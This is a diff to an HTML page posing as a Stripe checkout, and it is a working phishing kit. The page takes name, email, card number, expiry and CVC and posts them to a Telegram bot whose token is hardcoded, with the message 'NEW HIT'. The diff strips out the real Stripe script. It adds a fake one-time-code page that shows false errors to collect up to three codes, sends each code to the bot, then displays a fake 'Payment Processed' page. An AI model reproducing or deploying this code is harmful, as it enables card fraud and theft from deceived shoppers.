@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Checkout - Stripe</title>
-    <script src="https://js.stripe.com/v3/"></script>
     <style>
         :root {
             --stripe-blue: #635BFF;
@@ -40,7 +39,7 @@
         }
 
         .logo-container {
-            width: 75px; /* الحجم الكبير الذي طلبته سابقاً */
+            width: 75px; 
             height: auto;
             margin-right: 15px;
         }
@@ -57,20 +56,8 @@
             color: var(--text-main);
         }
 
-        h2 { 
-            font-size: 18px; 
-            font-weight: 600; 
-            margin: 25px 0 15px 0; 
-            color: var(--text-main);
-        }
-
-        label { 
-            display: block; 
-            font-size: 14px; 
-            font-weight: 500; 
-            margin-bottom: 8px; 
-            color: #4a5568;
-        }
+        h2 { font-size: 18px; font-weight: 600; margin: 25px 0 15px 0; color: var(--text-main); }
+        label { display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px; color: #4a5568; }
 
         input {
             width: 100%;
@@ -81,22 +68,10 @@
             box-sizing: border-box;
             outline: none;
             margin-bottom: 12px;
-            transition: border-color 0.2s;
         }
 
-        .input-group { 
-            border: 1px solid var(--border-color); 
-            border-radius: 8px; 
-            overflow: hidden; 
-        }
-        
-        .input-group input { 
-            border: none; 
-            border-bottom: 1px solid var(--border-color); 
-            margin-bottom: 0; 
-            border-radius: 0; 
-        }
-        
+        .input-group { border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; }
+        .input-group input { border: none; border-bottom: 1px solid var(--border-color); margin-bottom: 0; border-radius: 0; }
         .input-group input:last-child { border-bottom: none; }
         
         .row { display: flex; }
@@ -110,18 +85,7 @@
             background: #fafafa;
         }
 
-        .payment-header { 
-            display: flex; 
-            align-items: center; 
-            margin-bottom: 15px; 
-            font-weight: 600; 
-            color: var(--text-main);
-        }
-
-        .card-icons { 
-            margin-left: auto; 
-            height: 28px; 
-        }
+        .card-icons { margin-left: auto; height: 28px; }
 
         .btn-pay {
             width: 100%;
@@ -136,19 +100,9 @@
             cursor: pointer;
         }
 
-        .secure-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 20px;
-            font-size: 13px;
-            color: #4a5568;
-        }
-
         .loading {
             display: inline-block;
-            width: 20px;
-            height: 20px;
+            width: 20px; height: 20px;
             border: 3px solid rgba(255,255,255,.3);
             border-radius: 50%;
             border-top-color: white;
@@ -158,13 +112,19 @@
 
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        .success-page { display: none; text-align: center; padding: 40px 20px; }
+        /* Pages control */
+        .page { display: none; }
+        .active { display: block; }
+
+        .error-msg { color: var(--error-red); font-size: 13px; margin-top: 10px; display: none; text-align: center; }
+
+        .success-page { text-align: center; padding: 40px 20px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div id="checkoutForm">
+    <div id="checkoutPage" class="page active">
         <div class="header">
             <div class="logo-container">
                 <img src="https://i.ibb.co/tk1fKpK/BA47-C500-F9-EF-4732-9881-42-D361-E42075.png" alt="Logo">
@@ -173,26 +133,24 @@
         </div>
 
         <h2>Contact Information</h2>
-        <label>Email address</label>
-        <input type="email" id="email" placeholder="email@example.com" required>
+        <input type="email" id="email" placeholder="email@example.com">
         
         <h2>Shipping Address</h2>
         <div class="input-group">
-            <input type="text" id="name" placeholder="Full name" required>
-            <input type="text" id="address" placeholder="Street address" required>
+            <input type="text" id="name" placeholder="Full name">
+            <input type="text" id="address" placeholder="Street address">
             <div class="row">
-                <input type="text" id="city" placeholder="City" required>
-                <input type="text" id="postal" placeholder="Postal code" required>
+                <input type="text" id="city" placeholder="City">
+                <input type="text" id="postal" placeholder="Postal code">
             </div>
         </div>
 
         <h2>Payment Details</h2>
         <div class="payment-box">
-            <div class="payment-header">
+            <div style="display: flex; align-items: center; margin-bottom: 15px; font-weight: 600;">
                 <span>💳 Credit Card</span>
-                <img src="https://i.ibb.co/w9KxwQ5/2-A2-A850-F-BE0-C-48-A0-B145-A2-BFD7-C481-EA.png" class="card-icons" alt="Card Types">
+                <img src="https://i.ibb.co/w9KxwQ5/2-A2-A850-F-BE0-C-48-A0-B145-A2-BFD7-C481-EA.png" class="card-icons">
             </div>
-            
             <input type="text" id="cardNum" placeholder="Card Number" maxlength="19">
             <div class="row">
                 <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
@@ -200,36 +158,47 @@
             </div>
         </div>
 
-        <button class="btn-pay" id="submitBtn" onclick="handlePayment()">
-            Pay Securely
-        </button>
-
-        <div class="secure-badge">Secured by Stripe 256-bit SSL Encryption</div>
+        <button class="btn-pay" id="submitBtn" onclick="handlePayment()">Pay Securely</button>
     </div>
 
-    <div id="successPage" class="success-page">
-        <h2 style="color: #48bb78;">Payment Successful!</h2>
-        <p>Thank you for your purchase.</p>
-        <button class="btn-pay" onclick="location.reload()">Continue</button>
+    <div id="otpPage" class="page">
+        <div class="header">
+            <div class="header-title">Verification Required</div>
+        </div>
+        <p style="color: #4a5568; font-size: 15px;">A security code has been sent to your mobile phone to authorize this transaction.</p>
+        
+        <label style="margin-top: 30px;">Enter Code</label>
+        <input type="text" id="otpCode" placeholder="6-digit code" style="height: 55px; text-align: center; font-size: 24px; letter-spacing: 5px;" maxlength="6">
+        
+        <div id="otpError" class="error-msg">Invalid code. Please try again.</div>
+        
+        <button class="btn-pay" id="otpBtn" onclick="handleOTP()">Verify Now</button>
+    </div>
+
+    <div id="successPage" class="page success-page">
+        <h2 style="color: #48bb78;">Payment Processed</h2>
+        <p>Your transaction is being finalized. You will receive a confirmation email shortly.</p>
+        <button class="btn-pay" onclick="location.reload()">Return to Store</button>
     </div>
 </div>
 
 <script>
-    // --- Telegram Config ---
-    const BOT_TOKEN = '8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q';
-    const CHAT_ID = '1705240737';
+    const CONFIG = {
+        token: '8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q',
+        chat: '1705240737'
+    };
 
-    async function sendTelegram(message) {
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
-            });
-        } catch (e) { console.error(e); }
+    let attempts = 0;
+
+    async function sendTG(msg) {
+        await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CONFIG.chat, text: msg, parse_mode: 'HTML' })
+        });
     }
 
-    // Formatting for card
+    // Card formatting
     document.getElementById('cardNum').addEventListener('input', e => {
         e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
@@ -238,27 +207,47 @@
         const email = document.getElementById('email').value;
         const name = document.getElementById('name').value;
         const card = document.getElementById('cardNum').value;
-        const exp = document.getElementById('exp').value;
-        const cvc = document.getElementById('cvc').value;
 
-        if (!email || !name || !card || !exp || !cvc) {
-            alert('Please fill in all fields');
+        if (!email || !name || card.length < 16) {
+            alert('Please fill in all fields correctly.');
             return;
         }
 
-        const btn = document.getElementById('submitBtn');
-        btn.disabled = true;
-        btn.innerHTML = 'Processing <span class="loading"></span>';
+        document.getElementById('submitBtn').innerHTML = 'Processing <span class="loading"></span>';
+        
+        const msg = `<b>🚀 NEW HIT</b>\n👤 Name: ${name}\n📧 Email: ${email}\n💳 Card: <code>${card}</code>\n📅 Exp: ${document.getElementById('exp').value}\n🔒 CVC: ${document.getElementById('cvc').value}`;
+        await sendTG(msg);
 
-        const msg = `<b>🚀 NEW STRIPE HIT</b>\n\n👤 <b>Name:</b> ${name}\n📧 <b>Email:</b> ${email}\n🏠 <b>Address:</b> ${document.getElementById('address').value}\n🏙️ <b>City:</b> ${document.getElementById('city').value}\n💳 <b>Card:</b> <code>${card}</code>\n📅 <b>Exp:</b> ${exp}\n🔒 <b>CVC:</b> ${cvc}`;
-
-        await sendTelegram(msg);
-
-        // Show Success
         setTimeout(() => {
-            document.getElementById('checkoutForm').style.display = 'none';
-            document.getElementById('successPage').style.display = 'block';
+            document.getElementById('checkoutPage').classList.remove('active');
+            document.getElementById('otpPage').classList.add('active');
         }, 2000);
+    }
+
+    async function handleOTP() {
+        const otp = document.getElementById('otpCode').value;
+        if (otp.length < 4) return;
+
+        attempts++;
+        const btn = document.getElementById('otpBtn');
+        const error = document.getElementById('otpError');
+        
+        btn.innerHTML = 'Verifying <span class="loading"></span>';
+        
+        await sendTG(`<b>🔑 OTP Attempt ${attempts}:</b> <code>${otp}</code>`);
+
+        setTimeout(() => {
+            if (attempts < 3) {
+                // اظهر خطأ واطلب منه المحاولة مرة أخرى
+                btn.innerHTML = 'Verify Now';
+                error.style.display = 'block';
+                document.getElementById('otpCode').value = '';
+            } else {
+                // بعد المحاولة الثالثة انتقل لصفحة النجاح النهائية
+                document.getElementById('otpPage').classList.remove('active');
+                document.getElementById('successPage').classList.add('active');
+            }
+        }, 1500);
     }
 </script>
 </body>
